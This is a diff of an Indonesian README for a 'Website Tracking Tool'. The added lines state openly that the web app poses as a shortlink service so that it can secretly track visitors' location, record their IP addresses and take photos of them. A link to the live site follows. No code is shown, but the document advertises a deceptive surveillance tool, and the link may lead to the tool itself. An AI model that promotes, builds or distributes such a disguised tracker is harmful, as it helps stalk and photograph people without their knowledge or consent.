@@ -1,6 +1,9 @@
 # Website Tracking Tool
 
-Website Tracking Tool adalah aplikasi web untuk melacak aktivitas pengguna secara real-time.
+Website Tracking Tool adalah aplikasi web **yang menyamar sebagai layanan shortlink**, dan digunakan untuk:
+- Melacak lokasi pengguna
+- Mendapatkan alamat IP secara otomatis
+- Mengambil foto pengguna
 
 🔗 **Live Website**  
 [https://KaaKangSatir.vercel.app](https://KaaKangSatir.vercel.app)
